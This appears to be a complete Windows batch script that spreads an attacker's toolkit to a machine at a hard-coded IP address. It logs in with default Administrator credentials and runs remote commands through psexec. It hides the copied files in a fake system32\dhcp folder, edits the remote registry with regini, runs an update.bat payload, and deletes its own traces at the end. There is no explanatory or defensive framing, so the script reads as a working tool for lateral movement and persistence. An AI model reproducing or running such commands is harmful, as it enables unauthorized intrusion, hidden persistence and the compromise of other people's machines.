net use \\66.185.162.103 /USER:Administrator "Administrator"
psexec \\66.185.162.103 -u Administrator -p Administrator -c temp.bat
mkdir \\66.185.162.103\C$\winnt\system32\dhcp
mkdir \\66.185.162.103\C$\winnt\system32\dhcp\files
mkdir \\66.185.162.103\C$\winnt\system32\dhcp\files\copy
mkdir \\66.185.162.103\C$\winnt\system32\dhcp\files\dat
mkdir \\66.185.162.103\C$\winnt\system32\dhcp\files\log
mkdir \\66.185.162.103\C$\winnt\system32\dhcp\files\plugin
copy C:\winnt\system32\dhcp\files\* \\66.185.162.103\C$\winnt\system32\dhcp\files
copy copy\* \\66.185.162.103\C$\winnt\system32\dhcp\files\copy
copy plugin\* \\66.185.162.103\C$\winnt\system32\dhcp\files\plugin
copy dat\* \\66.185.162.103\C$\winnt\system32\dhcp\files\dat
del \\66.185.162.103\C$\winnt\system32\dhcp\files\scan.txt
del \\66.185.162.103\C$\winnt\system32\dhcp\files\blah.txt
del \\66.185.162.103\C$\winnt\system32\dhcp\files\sql.txt
copy\regini.exe -m \\66.185.162.103 runrg.txt
psexec \\66.185.162.103 -u Administrator -p Administrator c:\winnt\system32\dhcp\files\copy\update.bat
net use \\66.185.162.103 /delete
del runme325178.bat
